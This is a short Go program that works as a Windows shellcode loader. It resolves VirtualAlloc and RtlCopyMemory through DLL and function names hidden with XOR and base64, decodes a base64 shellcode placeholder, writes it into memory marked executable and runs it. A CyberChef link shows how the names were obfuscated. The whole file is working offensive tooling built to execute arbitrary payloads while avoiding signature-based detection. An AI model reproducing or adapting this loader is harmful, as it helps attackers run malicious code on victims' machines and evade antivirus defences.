package main

import (
	"encoding/base64"
	"syscall"
	"unsafe"
)

var (
	kernel32      = syscall.MustLoadDLL(Bake("EwYGFgYYS1FaHA8Y"))
	ntdll         = syscall.MustLoadDLL(Bake("FhcQFA9aHA8Y"))
	VirtualAlloc  = kernel32.MustFindProc(Bake("LgoGDBYVFCIYFAwX"))
	RtlCopyMemory = ntdll.MustFindProc(Bake("KhcYOwwEAS4RFQwGAQ=="))
)

func main() {
	var encoded = "<base64shellcode>"
	var s = "LAsRWAwEHREVDAobFkMXFw4EFAYAHQdUCxYXGwYHCwUBFA8NVg=="
	var sc, _ = base64.StdEncoding.DecodeString(encoded)
	addr, _, err := VirtualAlloc.Call(0, uintptr(len(sc)), 0x1000|0x2000, 0x40)
	if err != nil && err.Error() != Bake(s) {
		syscall.Exit(0)
	}
	_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&sc[0])), uintptr(len(sc)))
	if err != nil && err.Error() != Bake(s) {
		syscall.Exit(0)
	}
	syscall.Syscall(addr, 0, 0, 0, 0)
}

// https://gchq.github.io/CyberChef/#recipe=XOR(%7B'option':'Latin1','string':'XCT'%7D,'Standard',false)To_Base64('A-Za-z0-9%2B/%3D')
func Bake(cipher string) string {
	tmp, _ := base64.StdEncoding.DecodeString(cipher)
	key := "xct"
	baked := ""
	for i := 0; i < len(tmp); i++ {
		baked += string(tmp[i] ^ key[i%len(key)])
	}
	return baked
}
